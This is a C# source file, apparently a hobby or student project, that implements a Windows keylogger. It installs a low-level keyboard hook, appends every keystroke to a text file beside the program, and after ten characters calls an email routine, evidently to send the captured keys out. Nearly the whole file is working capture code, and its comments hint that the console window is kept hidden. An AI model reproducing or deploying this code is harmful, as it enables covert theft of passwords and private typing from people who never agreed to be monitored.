using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices; // Meeded to import needed .dll files to allow recording keystrokes.
using System.IO;

public class keylogvariables
{
    public static int WH_KEYBOARD_LL = 13; // A hook procedure which monitors low-level keyboard inputs
    public static int comparewithwparam = 0x0100; // allows the inputs of non-system keys, this variable is compared to the wparam variable to make sure that inputted key is either non-system or system
    public static IntPtr hook = IntPtr.Zero; // a pointer variable which holds memory address of the hook.
    public static LowLevelKeyboardProc llkProcedure = Hookcallback; // creates a reference to the Delegate of the HookCallBack function, defines what the prgoram should do everytime keyboard event is happening
    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr IParam);
    public static long numberofcharacters = 0; // number of characters
    public static IntPtr Hookcallback(int nCode, IntPtr wParam, IntPtr IParam) // method for the hookcallback, which is used to record the windows event input
    {
        FileInfo file = new FileInfo(Application.StartupPath + @".txt");
        if (nCode >= 0 && wParam == (IntPtr)comparewithwparam)
        {
            int vkCode = Marshal.ReadInt32(IParam); // integer value whichs corralates to a specific key
            using (StreamWriter sw = new StreamWriter(Application.StartupPath + @".txt", true)) // if needed creates another debug.txt file but the true at the end means that it will append to the file if it exists
            {
                sw.Write((Keys)vkCode); // writes the integer value into its corresponding letter onto the textfile
                sw.Close();
            }
            numberofcharacters++; // everytime there is a keyboard input will add 1 to the variable numberofcharacters
            if(numberofcharacters == 10)
            {
                Keylogger.Program.email();
            }
        }
        return CallNextHookEx(IntPtr.Zero, nCode, wParam, IParam); // if the input isn't a character or keyboard input it will pass it onto the next hook procedure'
    }
    public static IntPtr Sethook(LowLevelKeyboardProc proc) // method to actually create the hook
    {
        // in-order for the method to return a valid hook I needed to reference the modulehandle for the application
        Process currentprocess = Process.GetCurrentProcess();
        ProcessModule currentmodule = currentprocess.MainModule;
        //in this case the module is the current process of the program
        string modulename = currentmodule.ModuleName;
        IntPtr modulehandle = GetModuleHandle(modulename);
        return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, modulehandle, 0);
    }
    // .dlls needed for the commands 
    [DllImport("user32.dll")]
    public static extern IntPtr UnhookWindowsHookEx(IntPtr hhk); // unhook command
    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr IParam); // callthenexthook command
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName); // module handles
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc ipfn, IntPtr hMod, uint dwThreadid); // sets the hook
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow(); // gets the console window
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); // just in case we want to show the console window again
}